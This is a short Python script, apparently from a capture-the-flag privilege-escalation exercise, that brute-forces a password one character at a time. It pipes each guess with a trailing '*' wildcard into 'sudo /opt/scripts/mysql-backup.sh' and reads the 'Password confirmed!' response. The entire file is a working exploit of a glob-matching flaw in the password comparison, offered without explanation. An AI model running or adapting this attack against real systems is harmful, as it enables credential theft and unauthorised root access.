import string
import subprocess
import sys

all_characters = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all_characters:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)

            # Actualizar barra de progreso
            sys.stdout.write('\r')
            sys.stdout.write("[%-10s] %d%%" % ('=' * ((len(password) * 10) // len(all_characters)), (len(password) * 100) // len(all_characters)))
            sys.stdout.flush()

            break
    else:
        found = True
      
